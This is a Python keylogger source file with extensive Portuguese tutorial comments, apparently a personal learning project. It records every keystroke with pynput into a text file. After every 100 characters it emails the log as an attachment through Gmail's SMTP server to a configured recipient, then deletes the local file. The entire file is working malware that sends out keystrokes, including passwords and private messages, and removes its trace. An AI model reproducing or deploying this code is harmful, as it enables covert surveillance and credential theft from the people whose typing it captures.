# Projeto Keylogger - Python
# Autor: Iuri Lopes Almeida
# Data: 26/05/2020
# Descrição: Esse programa foi escrito na linguagem Python e usou a biblioteca
# 			 Pynput e SMTPLib como base. Ele faz o monitoramento do teclado do
# 			 (usuário), armazenando o tipo de tecla que foi apertada em um arquivo
#            texto e faz o envio desse arquivo texto para o email escolhido.
# Forma de uso: python keylogger.py


# Importação necessária.
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import os


# Array resposnsável por fazer a contagem de quantas teclas foram pressionadas.
numLetras = []


# Função responsável por fazer o envio do email.
# remetente -> email de quem está enviando o email.
# senhaRemetente -> senha de quem está enviando o email.
# destinatario -> email de quem está recebendo o email.
# titulo -> título do email.
# corpoMensagem -> assunto do email.
# nomeArquivo -> nome do arquivo que deseja enviar em anexo.
def sendEmail(remetente, senhaRemetente, destinatario, titulo, corpoMensagem, nomeArquivo):

    # Tente fazer o envio do email.
    try:

        # Montando uma variável para receber todas as partes de uma mensagem em um email.
        msg = MIMEMultipart()

        # Passando o email do remetente, do destinatário e o título do email.
        msg['From'] = remetente
        msg['To'] = destinatario
        msg['Subject'] = titulo

        # Juntando e organizando todas as partes informadas da mensagem com o corpo da
        # da mensagem passada.
        msg.attach(MIMEText(corpoMensagem, 'plain'))

        # Abrindo o arquivo onde terá as informações monitoradas pelo keylogger.
        # Obs.: O 'rt' significa que pode ser lido ('r') e que tem o valor de um
        #       texto ('t'), ou seja, que só contém texto dentro.
        # Obs.: Caso você deseja usar para enviar uma imagem/vídeo é interessante usar
        #       a extensão de binário ('b').
        anexo = open(nomeArquivo, 'rt')

        # Montando uma variável para receber as informações para fazer a codificação do anexo.
        anexoCod = MIMEBase('application', 'octet-stream')

        # Fazendo a leitura do anexo.
        anexoCod.set_payload((anexo).read())

        # Fazendo a codificação do anexo em base64.
        encoders.encode_base64(anexoCod)

        # Dizendo qual é o título do arquivo.
        anexoCod.add_header('Content-Disposition', "attachment; filename= " + nomeArquivo)

        # Juntando o anexo com a mensagem depois da codificação.
        msg.attach(anexoCod)

        # Fechando o arquivo.
        anexo.close()

        # Transformando tudo que tem em uma forma que a gente consiga ler.
        mensagem = msg.as_string()

        # Estabelecendo uma conexão com o servidor do Google.
        # Obs.: Outros servidores:
        #           . Yahoo -> smtp.mail.yahoo.com:465 ou 587
        #           . iCloud -> smtp.mail.me.com:587
        #           . Outlook, Hotmail -> smtp.office365.com:587
        # Link: https://support.office.com/pt-br/article/configura%C3%A7%C3%B5es-de-email-pop-e-imap-para-o-outlook-8361e398-8af4-4e97-b147-6c6c4ac95353
        # Obs.: É insteressante dar uma olhada nesse link, pois
        #       nele também mostra os diferentes tipos de criptografia
        #       usadas em alguns dos servidores listados.
        servidor = smtplib.SMTP('smtp.gmail.com:587')

        # Fazer sua identificação para o servidor de email.
        servidor.ehlo()

        # Colocar essa conexão em modo TLS (Transfer Security Layer).
        # Obs.: TLS é um protocolo de segurança que faz a criptografia
        #       dos dados que estão sendo enviados do cliente (esse "código")
        #       para o servidor (servidor do Google).
        servidor.starttls()

        # Fazer o login no servidor com a conta que irá enviar o email.
        servidor.login(remetente, senhaRemetente)

        # Envie (de, para, essa mensagem).
        servidor.sendmail(remetente, destinatario, mensagem)

        # Saia do servidor.
        servidor.quit()

        # Imprima que tudo ocorreu bem.
        print("Email enviado!")

    # Se caso houve algum erro no envio, faça:
    except:

        # Imprima que ocorreu um erro.
        print("Erro ao enviar o email!")


# Função responsável por receber o texto que foi digitado e escrevê-lo
# em um arquivo de texto.
# texto -> texto (teclas) que será escrito pelo teclado.
def salvarTexto(texto):

    # Caminho para salvar o arquivo.
    caminhoArquivo = "keylogger.txt"

    # Cria o arquivo caso ele não exista e faz com que adicione a última
    # tecla apertada no final do arquivo.
    # Obs.: O "a" vem da função append(), que adiciona um objeto no final
    # 		de um array, por exemplo.
    apendice = "a"

    # Criando um arquivo de texto que irá receber o nome das teclas que
    # que forem clicadas.
    with open(caminhoArquivo, apendice) as arquivo:

        # Escreve o texto recebido pela função no arquivo de texto criado.
        arquivo.write(str(texto))


# Função responsável por receber todas as teclas que forem pressionadas
# no teclado.
# key -> toda tecla pressionada no teclado.
def press(key):

    # Tente escrever a tecla em forma de caracter alfanumérico.
    try:

        # Chama a função para escrever no arquivo de texto.
        # Obs.: A opção .char passa as teclas como caracteres alfanuméricos.
        # 		Para facilitar a leitura.
        salvarTexto(key.char)

        # Adicione o caracter pressionado ao array numLetras[].
        # Osb.: Perceba que o array numLetras[] só está contabilizando as teclas
        #       alfanuméricas.
        numLetras.append(key)

    # Caso alguma dessas teclas não seja possível escrever como caracteres
    # alfanuméricos (ctrl, shift, tab, backspace, ...), escreva o nome
    # dessas teclas.
    except AttributeError:

        # Aqui estão algumas exceções que achei interessante colocar,
        # mas sinta-se a vontade para escolher suas regras de registro.

        # Se a tecla apertada for o "espaço", faça:
        if key == Key.space:

            # Adicione uma quebra de linha ao arquivo de texto.
            salvarTexto("\n")

        # Se a tecla apertada for o "caps_lock", faça:
        elif key == Key.caps_lock:

            # Não adicione nada ao arquivo de texto.
            salvarTexto("")

        # Caso não seja nenhuma das opções acima, faça:
        else:

            # Chama a função para escrever no arquivo de texto e passa o nome
            # da tecla não alfanumérica que foi apertada.
            salvarTexto(" <<" + str(key) + ">> ")

    # Se o número de letras digitados for igual a 100, faça:
    if len(numLetras) == 100:

        # Parâmetros para a função sendEmail().
        # Obs.: Para mais informações sobre a função sendEmail() dê uma olhada no
        #       repositório "Enviar-Email" aqui mesmo no meu perfil. :)
        remetente = ""
        senhaRemetente = ""
        destinatario = ""
        titulo = "Testando keylogger"
        mensagem = "Esse é um teste do keylogger"
        nomeArquivo = "keylogger.txt"

        # Chamando a função para enviar via email os dados contidos no arquivo criado.
        sendEmail(remetente, senhaRemetente, destinatario, titulo, mensagem, nomeArquivo)

        # Resetando o array (numLetras = []).
        numLetras.clear()

        # Tente:
        try:
            # Apagar o arquivo que foi criado no início do programa.
            os.remove("keylogger.txt")
            print("Arquivo apagado!")

        # Caso tenha algum erro:
        except OSError:
            print("Erro ao apagar arquivo!")

    # Se a tecla apertada for o "esc", termine o programa.
    # Obs.: Repare que por esse "if" estar fora do "except", ao clicar na tecla
    # 		"esc", ela primeiro será impressa no arquivo de texto e depois o
    # 		programa será finalizado.
    if key == Key.esc:

        # Qualquer parâmetro da função Listener() que retornar "False",
        # a função é encerrada.
        return False


'''
Observação sobre a função Listener().

	A função Listener() pode ainda receber um segundo parâmetro, o "on_release".
	Da mesma forma que o parâmetro "on_press" está relacionado ao clique (pressionar)
	da tecla, esse parâmetro (on_release) está relacionado a liberação da tecla, ou seja,
	depois de clicar (pressionar) a tecla, o usuário precisa liberá-la (release) para
	então apertar outra, essa outra será pressionada e liberada da mesma forma e assim
	em diante. Tirando esse detalhe de liberar a tecla, esse parâmetro atua basicamente
	da mesma maneira que o on_press, recebendo uma key (tecla) e retornando sempre
	que houver a liberação da tecla.

'''

# Dando um apelido a função Listener() e facilitando o início e fim do keylogger.
# Obs.: O with facilita a escrita e leitura do código.
with Listener(on_press=press) as listener:

    # Inicia a função de escutar.
    listener.join()
